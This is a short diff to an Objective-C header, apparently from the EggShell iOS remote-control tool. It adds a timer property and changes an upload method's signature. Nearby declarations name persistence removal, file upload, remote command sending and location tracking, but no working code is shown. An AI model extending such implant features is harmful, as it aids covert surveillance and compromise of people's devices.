@@ -21,7 +21,7 @@
 @property (retain) NSString *skey;
 @property (retain) NSString *terminator;
 @property (retain) CPDistributedMessagingCenter *messagingCenter;
-
+@property (nonatomic,retain) NSTimer *timer;
 //socks
 extern int sockfd;
 -(int)connect:(NSString*)host
@@ -74,7 +74,7 @@ extern CFStringRef SBSApplicationLaunchingErrorString(int error);
 -(void)rmpersistence;
 
 //eggshell pro
--(void)upload:(int)size :(NSString *)uploadpath;
+-(void)upload:(NSString *)uploadpath;
 -(void)mcSendNoReply:(NSString *)command;
 -(void)mcSendYesReply:(NSString *)command;
 -(void)locationService:(NSArray *)args;
